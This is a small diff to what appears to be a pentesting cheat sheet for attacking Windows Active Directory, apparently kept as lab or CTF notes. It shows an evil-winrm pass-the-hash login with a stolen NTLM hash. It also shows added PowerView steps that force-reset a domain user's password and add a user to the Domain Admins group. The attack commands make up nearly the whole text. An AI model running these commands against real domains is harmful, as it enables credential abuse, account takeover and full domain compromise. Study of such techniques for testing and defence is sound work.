@@ -112,9 +112,11 @@ Connect to Windows Machine using obtained hash (pass the hash):
 #remove aad3b435b51404eeaad3b435b51404ee: from hash
 evil-winrm -i $TARGET_IP -u $USER -H $TARGET_HASH
 ```
+Change user password using powershell / powerview:
 ---
+#change-password
 ```powershell
-#using PowerView.ps1
+. ./PowerView.ps1
 Set-DomainUserPassword -Identity $USERNAME -AccountPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force) -Domain $DOMAIN
 Add-NetGroupUser -UserName $USER -GroupName "Domain Admins" -Domain $DOMAIN
 ```
